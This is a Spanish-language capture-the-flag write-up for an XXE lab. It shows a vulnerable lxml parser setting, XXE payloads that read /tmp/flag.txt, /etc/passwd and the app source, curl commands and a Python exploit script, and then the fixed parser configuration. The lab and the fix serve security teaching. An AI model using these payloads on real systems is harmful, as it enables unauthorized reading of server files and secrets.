# Solución Reto 11: XXE — XML External Entity (ctf-xxe)

## Descripción

El servicio procesa documentos XML con `lxml` y extrae el contenido del elemento `<data>`. El parser está configurado con resolución de entidades externas habilitada:

```python
parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
```

La flag está escrita en `/tmp/flag.txt`. Una entidad externa puede hacer que el parser lea ese archivo e inyecte su contenido en el XML.

## Explotación

### 1. Payload XXE básico

Enviar el siguiente XML via el formulario o con curl:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<root>
  <data>&xxe;</data>
</root>
```

El parser resuelve `&xxe;` leyendo `/tmp/flag.txt` y lo sustituye como contenido de `<data>`. El backend devuelve ese valor en la respuesta.

### 2. Con curl

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  -d 'xml=%3C%3Fxml+version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE+root+%5B%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Ftmp%2Fflag.txt%22%3E%0A%5D%3E%0A%3Croot%3E%3Cdata%3E%26xxe%3B%3C%2Fdata%3E%3C%2Froot%3E'
```

O más legible usando `--data-urlencode`:

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<root><data>&xxe;</data></root>'
```

### 3. Otros archivos interesantes

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///app/app.py">
```

## Script de explotación

```python
import urllib.request, urllib.parse, re

TARGET = "http://<HOST>:<PORT>"

payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<root><data>&xxe;</data></root>'''

data = urllib.parse.urlencode({"xml": payload}).encode()
with urllib.request.urlopen(TARGET + "/", data) as r:
    html = r.read().decode()

match = re.search(r'CTF\{[^}]+\}', html)
if match:
    print("Flag:", match.group())
```

## Causa raíz

`resolve_entities=True` + `load_dtd=True` permiten que el DOCTYPE declare entidades que referencian recursos del sistema de archivos local. El fix es deshabilitar ambas opciones:

```python
# Fix correcto
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)
```

## Flag

```
CTF{...}   ← contenido de /tmp/flag.txt via entidad externa
```
